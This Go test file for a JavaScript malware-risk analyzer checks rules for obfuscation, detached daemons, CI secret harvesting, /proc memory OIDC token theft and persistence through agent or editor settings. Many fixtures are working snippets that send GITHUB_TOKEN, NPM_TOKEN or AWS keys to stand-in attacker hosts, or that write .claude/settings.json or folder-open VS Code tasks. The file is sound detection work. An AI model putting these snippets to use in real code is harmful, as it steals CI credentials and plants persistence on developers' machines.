@@ -1,0 +1,4432 @@
+package jsrisk
+
+import (
+	"context"
+	"fmt"
+	"strings"
+	"testing"
+
+	"github.com/garagon/aguara/internal/scanner"
+	"github.com/garagon/aguara/internal/types"
+)
+
+func analyze(t *testing.T, relPath, content string) []types.Finding {
+	t.Helper()
+	a := New()
+	target := &scanner.Target{
+		Path:    relPath,
+		RelPath: relPath,
+		Content: []byte(content),
+	}
+	findings, err := a.Analyze(context.Background(), target)
+	if err != nil {
+		t.Fatalf("Analyze returned error: %v", err)
+	}
+	return findings
+}
+
+func hasRule(findings []types.Finding, ruleID string) bool {
+	for _, f := range findings {
+		if f.RuleID == ruleID {
+			return true
+		}
+	}
+	return false
+}
+
+func findRule(findings []types.Finding, ruleID string) *types.Finding {
+	for i := range findings {
+		if findings[i].RuleID == ruleID {
+			return &findings[i]
+		}
+	}
+	return nil
+}
+
+// --- target gating ---
+
+func TestIsJavaScriptTarget(t *testing.T) {
+	cases := []struct {
+		path string
+		want bool
+	}{
+		{"script.js", true},
+		{"module.mjs", true},
+		{"common.cjs", true},
+		{"sub/script.JS", true},
+		{"/repo/index.js", true},
+		{"script.ts", false},
+		{"script.json", false},
+		{"package.json", false},
+		{"README.md", false},
+	}
+	for _, c := range cases {
+		got := isJavaScriptTarget(&scanner.Target{Path: c.path, RelPath: c.path})
+		if got != c.want {
+			t.Errorf("isJavaScriptTarget(%q) = %v, want %v", c.path, got, c.want)
+		}
+	}
+}
+
+func TestAnalyzer_NonJSFile(t *testing.T) {
+	findings := analyze(t, "package.json", `{}`)
+	if len(findings) != 0 {
+		t.Fatalf("expected no findings for non-JS target, got %d", len(findings))
+	}
+}
+
+// --- JS_OBF_001 ---
+
+func TestSafe_PlainScript(t *testing.T) {
+	findings := analyze(t, "hello.js", `console.log("hello, world");`)
+	if hasRule(findings, RuleObfuscation) {
+		t.Errorf("plain script must not trigger JS_OBF_001, got: %+v", findings)
+	}
+}
+
+func TestSafe_MinifiedVendorBundleNoObfSignal(t *testing.T) {
+	// Large file, long single line, but no hex identifiers / dispatcher
+	// calls / while(!![]). Must not trigger.
+	body := strings.Repeat("var foo=function(a,b){return a+b;};", 20000) // ~700KB, single line if no newlines
+	findings := analyze(t, "vendor.js", body)
+	if hasRule(findings, RuleObfuscation) {
+		t.Errorf("minified vendor bundle without obfuscator signals must not trigger JS_OBF_001, got: %+v", findings)
+	}
+}
+
+func TestVuln_Obfuscation_HexIdentifiersAndWhileTrue(t *testing.T) {
+	// 200 _0xNNNN references plus while(!![]) is two obfuscator-specific
+	// signals — well above the threshold for JS_OBF_001.
+	body := strings.Repeat("var _0xabcd=1;", 200) + "\nwhile(!![]){console.log('a');}\n"
+	findings := analyze(t, "payload.js", body)
+	f := findRule(findings, RuleObfuscation)
+	if f == nil {
+		t.Fatalf("expected JS_OBF_001, got: %+v", findings)
+	}
+	if f.Severity != types.SeverityMedium {
+		t.Errorf("obfuscation-only chain should be MEDIUM, got %v", f.Severity)
+	}
+}
+
+func TestVuln_Obfuscation_EscalatesWithProcessEnv(t *testing.T) {
+	body := strings.Repeat("var _0xabcd=1;", 200) + "\nwhile(!![]){var x=process.env.GITHUB_TOKEN;}\n"
+	findings := analyze(t, "payload.js", body)
+	f := findRule(findings, RuleObfuscation)
+	if f == nil {
+		t.Fatalf("expected JS_OBF_001, got: %+v", findings)
+	}
+	if f.Severity != types.SeverityHigh {
+		t.Errorf("obfuscation + process.env should be HIGH, got %v", f.Severity)
+	}
+}
+
+// --- JS_DAEMON_001 ---
+
+func TestSafe_NormalSpawn(t *testing.T) {
+	body := `const { spawn } = require('child_process'); spawn('ls', ['-l']);`
+	findings := analyze(t, "ok.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("normal spawn must not trigger JS_DAEMON_001, got: %+v", findings)
+	}
+}
+
+func TestVuln_Daemon_DetachedIgnoreStdio(t *testing.T) {
+	body := `
+const cp = require('child_process');
+const child = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+child.unref();
+`
+	findings := analyze(t, "daemon.js", body)
+	f := findRule(findings, RuleDaemon)
+	if f == nil {
+		t.Fatalf("expected JS_DAEMON_001, got: %+v", findings)
+	}
+	if f.Severity != types.SeverityHigh {
+		t.Errorf("daemon shape alone should be HIGH, got %v", f.Severity)
+	}
+}
+
+func TestVuln_Daemon_EscalatesWithSecretAccess(t *testing.T) {
+	body := `
+const cp = require('child_process');
+const tok = process.env.GITHUB_TOKEN;
+fetch('https://attacker/x', {method:'POST', body:tok});
+const child = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+child.unref();
+`
+	findings := analyze(t, "daemon2.js", body)
+	f := findRule(findings, RuleDaemon)
+	if f == nil {
+		t.Fatalf("expected JS_DAEMON_001, got: %+v", findings)
+	}
+	if f.Severity != types.SeverityCritical {
+		t.Errorf("daemon + secret/network should be CRITICAL, got %v", f.Severity)
+	}
+}
+
+func TestSafe_DetachedFalseDoesNotTrigger(t *testing.T) {
+	body := `const child = require('child_process').spawn('ls', [], { detached: false, stdio: 'ignore' });`
+	findings := analyze(t, "x.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("detached:false must not trigger daemon, got: %+v", findings)
+	}
+}
+
+// --- JS_CI_SECRET_HARVEST_001 ---
+
+func TestSafe_SecretReadWithoutSink(t *testing.T) {
+	body := `if (process.env.GITHUB_TOKEN) { console.log('have token'); }`
+	findings := analyze(t, "x.js", body)
+	if hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("secret read without sink must not trigger harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_CISecretHarvest_TokenAndFetch(t *testing.T) {
+	body := `
+const t = process.env.GITHUB_TOKEN;
+fetch('https://attacker.example/exfil', {method:'POST', body: t});
+`
+	findings := analyze(t, "h.js", body)
+	f := findRule(findings, RuleCISecretHarvest)
+	if f == nil {
+		t.Fatalf("expected JS_CI_SECRET_HARVEST_001, got: %+v", findings)
+	}
+	if f.Severity != types.SeverityCritical {
+		t.Errorf("harvest should be CRITICAL, got %v", f.Severity)
+	}
+	if !strings.Contains(f.MatchedText, "GITHUB_TOKEN") {
+		t.Errorf("MatchedText should mention the secret name, got %q", f.MatchedText)
+	}
+}
+
+func TestVuln_CISecretHarvest_NpmRegistrySink(t *testing.T) {
+	body := `
+const t = process.env.NPM_TOKEN;
+require('https').request('https://registry.npmjs.org/-/npm/v1/tokens', {method:'PUT'});
+`
+	findings := analyze(t, "p.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("npm registry sink with NPM_TOKEN should trigger harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_CISecretHarvest_GitHubGraphQLSink(t *testing.T) {
+	body := `
+const t = process.env.GITHUB_TOKEN;
+fetch('https://api.github.com/graphql', {method:'POST', headers:{Authorization:'Bearer '+t}, body:'{createCommitOnBranch}'});
+`
+	findings := analyze(t, "g.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("GitHub graphql + token should trigger harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_CISecretHarvest_SessionExfilSink(t *testing.T) {
+	body := `
+const t = process.env.AWS_SECRET_ACCESS_KEY;
+fetch('https://filev2.getsession.org/', {method:'POST', body:t});
+`
+	findings := analyze(t, "s.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("session exfil endpoint should trigger harvest, got: %+v", findings)
+	}
+}
+
+// --- JS_PROC_MEM_OIDC_001 ---
+
+func TestSafe_ProcOnlyNoOIDC(t *testing.T) {
+	body := `const cpu = require('fs').readFileSync('/proc/stat');`
+	findings := analyze(t, "x.js", body)
+	if hasRule(findings, RuleProcMemOIDC) {
+		t.Errorf("/proc/stat read without OIDC must not trigger ProcMemOIDC, got: %+v", findings)
+	}
+}
+
+func TestVuln_ProcMemOIDC_TokenEnv(t *testing.T) {
+	body := `
+const fs = require('fs');
+const dir = fs.readdirSync('/proc');
+for (const pid of dir) {
+  const mem = fs.readFileSync('/proc/' + pid + '/mem');
+  if (mem.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {
+    fetch('https://attacker/x', {method:'POST', body: mem});
+  }
+}
+`
+	findings := analyze(t, "scan.js", body)
+	f := findRule(findings, RuleProcMemOIDC)
+	if f == nil {
+		t.Fatalf("expected JS_PROC_MEM_OIDC_001, got: %+v", findings)
+	}
+	if f.Severity != types.SeverityCritical {
+		t.Errorf("proc mem + OIDC must be CRITICAL, got %v", f.Severity)
+	}
+}
+
+func TestVuln_ProcMemOIDC_RunnerWorker(t *testing.T) {
+	body := `
+const maps = require('fs').readFileSync('/proc/self/maps');
+if (maps.includes('Runner.Worker')) { /* pivot */ }
+`
+	findings := analyze(t, "r.js", body)
+	if !hasRule(findings, RuleProcMemOIDC) {
+		t.Errorf("/proc + Runner.Worker should trigger, got: %+v", findings)
+	}
+}
+
+// --- AGENT_PERSISTENCE_001 ---
+
+func TestSafe_DocumentationMention(t *testing.T) {
+	// A literal /* .claude/settings.json */ inside a code comment in an
+	// unrelated tool should still flag because the analyzer cannot know
+	// it is a comment. We do not promise to skip comments. Just verify
+	// the rule fires consistently on the path mention.
+	body := `console.log("hello");`
+	findings := analyze(t, "x.js", body)
+	if hasRule(findings, RuleAgentPersistence) {
+		t.Errorf("script with no agent-path mention must not trigger, got: %+v", findings)
+	}
+}
+
+func TestVuln_AgentPersistence_ClaudeSettings(t *testing.T) {
+	body := `
+const fs = require('fs');
+fs.writeFileSync(process.env.HOME + '/.claude/settings.json', '{"hooks":{}}');
+`
+	findings := analyze(t, "ap.js", body)
+	f := findRule(findings, RuleAgentPersistence)
+	if f == nil {
+		t.Fatalf("expected AGENT_PERSISTENCE_001, got: %+v", findings)
+	}
+	if f.Severity != types.SeverityHigh {
+		t.Errorf("agent persistence alone should be HIGH, got %v", f.Severity)
+	}
+}
+
+func TestVuln_AgentPersistence_VSCodeRunOnFolderOpen(t *testing.T) {
+	body := `
+require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
+  tasks: [{label: 'init', command: 'node setup.mjs', runOn: 'folderOpen'}]
+}));
+`
+	findings := analyze(t, "v.js", body)
+	if !hasRule(findings, RuleAgentPersistence) {
+		t.Errorf("expected AGENT_PERSISTENCE_001 for VS Code folderOpen, got: %+v", findings)
+	}
+}
+
+func TestVuln_AgentPersistence_EscalatesWithSecretHarvest(t *testing.T) {
+	body := `
+const t = process.env.GITHUB_TOKEN;
+fetch('https://attacker/x', {method:'POST', body:t});
+require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
+`
+	findings := analyze(t, "ap2.js", body)
+	f := findRule(findings, RuleAgentPersistence)
+	if f == nil {
+		t.Fatalf("expected AGENT_PERSISTENCE_001, got: %+v", findings)
+	}
+	if f.Severity != types.SeverityCritical {
+		t.Errorf("persistence + secret harvest must be CRITICAL, got %v", f.Severity)
+	}
+}
+
+// --- pass-13 fixes: fetch local-method boundary + inline https.get ---
+
+func TestSafe_LocalFetchMethod(t *testing.T) {
+	// `.fetch(...)` on an unrelated object paired with a CI token
+	// read must not satisfy the network sink.
+	body := `
+const cache = makeCache();
+const t = process.env.GITHUB_TOKEN;
+cache.fetch({ token: t });
+`
+	findings := analyze(t, "lf.js", body)
+	if hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("local .fetch() must not chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_GlobalFetchStillFires(t *testing.T) {
+	// Global fetch (or `await fetch`) must still chain.
+	body := `
+const t = process.env.GITHUB_TOKEN;
+await fetch('https://attacker/x', {method:'POST', body:t});
+`
+	findings := analyze(t, "gf.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("global fetch must still chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_InlineHttpsGet(t *testing.T) {
+	body := `
+const t = process.env.GITHUB_TOKEN;
+require('https').get('https://attacker/x?t=' + encodeURIComponent(t));
+`
+	findings := analyze(t, "ig.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("require('https').get(...) inline must chain harvest, got: %+v", findings)
+	}
+}
+
+// --- pass-12 fixes: $-prefixed aliases + computed env reads ---
+
+func TestVuln_DollarPrefixedCPAlias(t *testing.T) {
+	body := `
+const $cp = require('child_process');
+$cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "dp.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("$cp alias (JS identifier with leading $) must chain daemon, got: %+v", findings)
+	}
+}
+
+func TestVuln_DollarPrefixedHTTPSAlias(t *testing.T) {
+	body := `
+const $h = require('https');
+const t = process.env.GITHUB_TOKEN;
+$h.request({hostname:'attacker.example'}).end(t);
+`
+	findings := analyze(t, "dh.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("$h alias must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_EnvReadOptionalChain(t *testing.T) {
+	body := `
+const t = process.env?.GITHUB_TOKEN;
+fetch('https://attacker/x', {body:t});
+`
+	findings := analyze(t, "oc.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("process.env?.NAME optional chaining must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_EnvReadTemplateBracket(t *testing.T) {
+	body := "const t = process.env[`GITHUB_TOKEN`];\nfetch('https://attacker/x', {body:t});\n"
+	findings := analyze(t, "tb.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("process.env[`NAME`] template-bracket form must chain harvest, got: %+v", findings)
+	}
+}
+
+// --- pass-11 fixes: HTTP module aliases, .vscode/setup.mjs gating ---
+
+func TestVuln_HttpsAliasRequestSink(t *testing.T) {
+	body := `
+const h = require('https');
+const t = process.env.GITHUB_TOKEN;
+h.request({hostname:'attacker.example', method:'POST'}).end(t);
+`
+	findings := analyze(t, "ha.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("aliased https.request must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_ESMNetAliasSink(t *testing.T) {
+	body := `
+import net from 'node:net';
+const t = process.env.AWS_SECRET_ACCESS_KEY;
+net.connect({port:1234, host:'attacker'}).write(t);
+`
+	findings := analyze(t, "na.mjs", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("ESM net alias must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestSafe_LocalNetVariable(t *testing.T) {
+	// A local `net` variable not bound from the node net module must
+	// not satisfy the alias network sink.
+	body := `
+const net = makeServer();
+const t = process.env.GITHUB_TOKEN;
+net.request({});
+`
+	findings := analyze(t, "ln.js", body)
+	if hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("local net variable must not chain harvest, got: %+v", findings)
+	}
+}
+
+func TestSafe_VSCodeSetupMjsAloneNoTrigger(t *testing.T) {
+	// A reference to .vscode/setup.mjs on its own does not auto-run.
+	// Without a tasks.json + runOn:folderOpen pair, this is not
+	// persistence.
+	body := `
+require('fs').writeFileSync('.vscode/setup.mjs', '// hello');
+`
+	findings := analyze(t, "vs.js", body)
+	if hasRule(findings, RuleAgentPersistence) {
+		t.Errorf(".vscode/setup.mjs alone must not chain persistence, got: %+v", findings)
+	}
+}
+
+// --- pass-10 fixes: imports-aware aliases, quoted runOn ---
+
+func TestSafe_LocalCPNotImported(t *testing.T) {
+	// A local variable named `cp` that is NOT bound from
+	// child_process must not satisfy the receiver match.
+	body := `
+const cp = makeControlPlane();
+cp.spawn('worker', { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "lcp.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("locally-defined cp must not chain daemon, got: %+v", findings)
+	}
+}
+
+func TestVuln_ESMNamespaceImportReceiver(t *testing.T) {
+	body := `
+import * as cp from 'node:child_process';
+cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "ns.mjs", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("ESM namespace import receiver must chain, got: %+v", findings)
+	}
+}
+
+func TestVuln_ESMDefaultImportReceiver(t *testing.T) {
+	body := `
+import cp from 'child_process';
+cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "df.mjs", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("ESM default import receiver must chain, got: %+v", findings)
+	}
+}
+
+func TestVuln_PersistenceQuotedRunOn(t *testing.T) {
+	// Single-quoted runOn key inside a .vscode/tasks.json write must
+	// still satisfy the persistence rule.
+	body := `
+require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
+  tasks: [{label:'init', command:'node setup.mjs', 'runOn': 'folderOpen'}]
+}));
+`
+	findings := analyze(t, "qr.js", body)
+	if !hasRule(findings, RuleAgentPersistence) {
+		t.Errorf("quoted 'runOn': 'folderOpen' inside tasks.json write must chain, got: %+v", findings)
+	}
+}
+
+// --- pass-9 fixes: aliased destructure binding, ESM imports ---
+
+func TestVuln_AliasedDestructureCJS(t *testing.T) {
+	body := `
+const { spawn: launch } = require('child_process');
+launch('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "ac.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("aliased CJS destructure (spawn:launch) must chain daemon, got: %+v", findings)
+	}
+}
+
+func TestVuln_ESMDestructureImport(t *testing.T) {
+	body := `
+import { spawn } from 'node:child_process';
+spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "esm.mjs", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("ESM import { spawn } from child_process must chain, got: %+v", findings)
+	}
+}
+
+func TestVuln_ESMAliasedImport(t *testing.T) {
+	body := `
+import { spawn as launch } from 'child_process';
+launch('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "esma.mjs", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("ESM aliased import (spawn as launch) must chain, got: %+v", findings)
+	}
+}
+
+func TestSafe_BareCallNamedSpawnNotImported(t *testing.T) {
+	// A function literally named `spawn` that has no child_process
+	// origin must not chain even if it carries daemon-shape options.
+	body := `
+function spawn(opts) { return opts; }
+spawn('node', ['x'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "ns.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("locally-defined spawn must not chain daemon, got: %+v", findings)
+	}
+}
+
+// --- pass-8 fixes: receiver-bound daemon match, drop .unref()-only chain ---
+
+func TestSafe_WorkerSpawnWithCPImported(t *testing.T) {
+	// File imports child_process AND has an unrelated worker.spawn(...)
+	// with daemon options. The unrelated receiver must not trip the
+	// rule even though the module is present.
+	body := `
+const cp = require('child_process');
+cp.exec('echo hello');
+const worker = makeWorker();
+worker.spawn('node', ['x'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "ws.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("worker.spawn(...) with daemon opts must not chain even when cp is imported, got: %+v", findings)
+	}
+}
+
+func TestVuln_CPMethodAliasMatches(t *testing.T) {
+	// `cp` is a conventional alias; method-form invocation with daemon
+	// options must chain.
+	body := `
+const cp = require('child_process');
+cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "cp.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("cp.spawn(...) alias chain must trigger daemon, got: %+v", findings)
+	}
+}
+
+func TestVuln_RequireChainInline(t *testing.T) {
+	// require('child_process').spawn(...) inline form must chain.
+	body := `
+require('child_process').spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "rc.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("require chain inline must chain daemon, got: %+v", findings)
+	}
+}
+
+func TestSafe_UnrefAloneWithoutStdioIgnore(t *testing.T) {
+	// detached:true + .unref() on the spawn return but without
+	// stdio:'ignore' no longer chains. The rule now requires
+	// stdio:'ignore' explicitly so unrelated `.unref()` calls
+	// (setTimeout(...).unref()) cannot satisfy the chain.
+	body := `
+const cp = require('child_process');
+const child = cp.spawn('node', ['./payload.js'], { detached: true });
+child.unref();
+`
+	findings := analyze(t, "u.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("unref-only chain (no stdio:ignore) should not fire, got: %+v", findings)
+	}
+}
+
+func TestSafe_UnrelatedUnrefInWindow(t *testing.T) {
+	// A spawn with detached:true followed by setTimeout().unref()
+	// nearby must not satisfy the chain (the .unref() is not on the
+	// child). With stdio:'ignore' absent, the rule cannot fire.
+	body := `
+const cp = require('child_process');
+cp.spawn('node', ['x'], { detached: true });
+setTimeout(() => {}, 1000).unref();
+`
+	findings := analyze(t, "tu.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("unrelated .unref() with no stdio:ignore must not chain, got: %+v", findings)
+	}
+}
+
+// --- pass-7 fixes: daemon proximity, aliased destructure, whitespace in network ---
+
+func TestSafe_DaemonOptionsFarFromSpawn(t *testing.T) {
+	// Daemon-shape options 600 bytes away from a child_process call
+	// fall outside the proximity window and must not chain.
+	padding := strings.Repeat("// padding line padding line padding line padding line\n", 12)
+	body := `
+const cp = require('child_process');
+cp.spawn('echo', ['hello']);
+` + padding + `
+const helperConfig = { detached: true, stdio: 'ignore' };
+`
+	findings := analyze(t, "fp.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("daemon options outside proximity window must not chain, got: %+v", findings)
+	}
+}
+
+func TestVuln_AliasedDestructureSecretRead(t *testing.T) {
+	body := `
+const { GITHUB_TOKEN: t } = process.env;
+fetch('https://attacker/x', {method:'POST', body:t});
+`
+	findings := analyze(t, "al.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("aliased destructured env read must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_MixedAliasedAndPlainDestructure(t *testing.T) {
+	body := `
+const { FOO, GITHUB_TOKEN: t, BAR: b } = process.env;
+fetch('https://attacker/x', {body: t});
+`
+	findings := analyze(t, "mx.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("mixed aliased/plain destructure must still pick CI secret, got: %+v", findings)
+	}
+}
+
+func TestVuln_NetworkSinkWhitespaceBeforeParen(t *testing.T) {
+	body := `
+const t = process.env.GITHUB_TOKEN;
+fetch ('https://attacker/x', {method:'POST', body: t});
+`
+	findings := analyze(t, "ws.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("fetch with whitespace before ( must chain harvest, got: %+v", findings)
+	}
+}
+
+// --- pass-6 fixes: child-process module gate, destructured env reads, runOn context ---
+
+func TestSafe_UnrelatedWorkerSpawnMethod(t *testing.T) {
+	// Calling .spawn(...) on an unrelated object should not chain
+	// daemon even when the file has detached:true / stdio:'ignore'.
+	body := `
+const worker = makeWorker();
+worker.spawn('node', ['x'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "w.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("non-child_process spawn must not chain daemon, got: %+v", findings)
+	}
+}
+
+func TestVuln_DestructuredSpawnImport(t *testing.T) {
+	// Destructured import is the more idiomatic Node form; daemon
+	// chain must recognize it.
+	body := `
+const { spawn } = require('child_process');
+spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "ds.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("destructured spawn import + invocation must chain, got: %+v", findings)
+	}
+}
+
+func TestVuln_DestructuredEnvSecretRead(t *testing.T) {
+	body := `
+const { GITHUB_TOKEN } = process.env;
+fetch('https://attacker/x', {method:'POST', body:GITHUB_TOKEN});
+`
+	findings := analyze(t, "de.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("destructured env read + sink must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_DestructuredEnvMultipleNames(t *testing.T) {
+	body := `
+const { FOO, GITHUB_TOKEN, BAR } = process.env;
+require('https').request('https://attacker/x').end(GITHUB_TOKEN);
+`
+	findings := analyze(t, "dem.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("destructured env with mixed names must still pick CI secret, got: %+v", findings)
+	}
+}
+
+func TestSafe_RunOnFolderOpenWithoutTasksContext(t *testing.T) {
+	// A standalone `runOn: 'folderOpen'` token outside any
+	// tasks.json reference (e.g. an extension helper or a schema
+	// definition) must not by itself chain persistence.
+	body := `
+const choices = {
+  runOn: ["folderOpen", "manual"],
+};
+console.log(choices);
+`
+	findings := analyze(t, "ro.js", body)
+	if hasRule(findings, RuleAgentPersistence) {
+		t.Errorf("runOn without tasks.json context must not chain, got: %+v", findings)
+	}
+}
+
+// --- pass-5 fixes: real env reads, real child_process calls, tasks.json gating ---
+
+func TestSafe_SecretNameMentionedNotRead(t *testing.T) {
+	// A string that names GITHUB_TOKEN (documentation, error message,
+	// UI label) plus an HTTP call must not by itself satisfy the
+	// harvest chain.
+	body := `
+console.error("GITHUB_TOKEN is required");
+fetch('https://api.example.com/health');
+`
+	findings := analyze(t, "doc.js", body)
+	if hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("documentation mention of GITHUB_TOKEN must not satisfy harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_SecretReadBracketForm(t *testing.T) {
+	// process.env['NAME'] form must still count as a real read.
+	body := `
+const t = process.env['GITHUB_TOKEN'];
+fetch('https://attacker/x', {method:'POST', body:t});
+`
+	findings := analyze(t, "br.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("process.env['GITHUB_TOKEN'] must satisfy harvest, got: %+v", findings)
+	}
+}
+
+func TestSafe_ChildProcessImportNoInvocation(t *testing.T) {
+	// Importing child_process without calling spawn/fork/exec must not
+	// satisfy the daemon chain even when an unrelated object literal
+	// in the file carries detached:true / stdio:'ignore'.
+	body := `
+const cp = require('child_process');
+const defaultOpts = { detached: true, stdio: 'ignore' };
+console.log('cp loaded; opts', defaultOpts);
+`
+	findings := analyze(t, "imp.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("child_process import alone must not chain daemon, got: %+v", findings)
+	}
+}
+
+func TestVuln_ChildProcessSpawnRequired(t *testing.T) {
+	body := `
+const cp = require('child_process');
+cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "sp.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("actual spawn invocation should still chain, got: %+v", findings)
+	}
+}
+
+func TestVuln_ChildProcessExecAccepted(t *testing.T) {
+	// .exec(...) is also an invocation.
+	body := `
+require('child_process').exec('long-running &', { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "ex.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf(".exec() must satisfy child-process invocation, got: %+v", findings)
+	}
+}
+
+func TestSafe_VSCodeTasksWithoutRunOn(t *testing.T) {
+	// Writing a manually-runnable .vscode/tasks.json (no folderOpen)
+	// must not by itself trigger AGENT_PERSISTENCE_001.
+	body := `
+require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
+  tasks: [{ label: 'manual', command: 'echo' }]
+}));
+`
+	findings := analyze(t, "v.js", body)
+	if hasRule(findings, RuleAgentPersistence) {
+		t.Errorf("manual .vscode/tasks.json must not chain persistence, got: %+v", findings)
+	}
+}
+
+func TestVuln_VSCodeTasksWithFolderOpen(t *testing.T) {
+	// Adding the folderOpen trigger turns a tasks.json write into
+	// real persistence.
+	body := `
+require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
+  tasks: [{ label: 'init', command: 'node setup.mjs',
+            runOptions: { runOn: 'folderOpen' } }]
+}));
+`
+	findings := analyze(t, "vf.js", body)
+	if !hasRule(findings, RuleAgentPersistence) {
+		t.Errorf("tasks.json + runOn:folderOpen must chain persistence, got: %+v", findings)
+	}
+}
+
+// --- pass-4 fixes: distinguish /proc/<pid>/<sub> from root /proc files ---
+
+func TestSafe_ProcMeminfoNotMemoryAccess(t *testing.T) {
+	// /proc/meminfo is a root-level file showing system memory totals.
+	// Even with an OIDC env reference in the same file, it must not
+	// trigger the runner-pivot rule.
+	body := `
+const totals = require('fs').readFileSync('/proc/meminfo', 'utf8');
+console.log(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN ? 'have' : 'no');
+`
+	findings := analyze(t, "mi.js", body)
+	if hasRule(findings, RuleProcMemOIDC) {
+		t.Errorf("/proc/meminfo must not chain ProcMemOIDC, got: %+v", findings)
+	}
+}
+
+func TestSafe_ProcCmdlineRootNotMemoryAccess(t *testing.T) {
+	// /proc/cmdline (no pid segment) shows kernel boot args; it is not
+	// a per-process pivot file.
+	body := `
+const bootArgs = require('fs').readFileSync('/proc/cmdline', 'utf8');
+const t = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
+`
+	findings := analyze(t, "rc.js", body)
+	if hasRule(findings, RuleProcMemOIDC) {
+		t.Errorf("root-level /proc/cmdline must not chain, got: %+v", findings)
+	}
+}
+
+func TestVuln_ProcMemTemplateLiteral(t *testing.T) {
+	// Template literal `/proc/${pid}/mem` is a real attacker form.
+	body := "const fs = require('fs');\nconst m = fs.readFileSync(`/proc/${pid}/mem`);\nif (m.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {}\n"
+	findings := analyze(t, "tmpl.js", body)
+	if !hasRule(findings, RuleProcMemOIDC) {
+		t.Errorf("template literal /proc/${pid}/mem must chain, got: %+v", findings)
+	}
+}
+
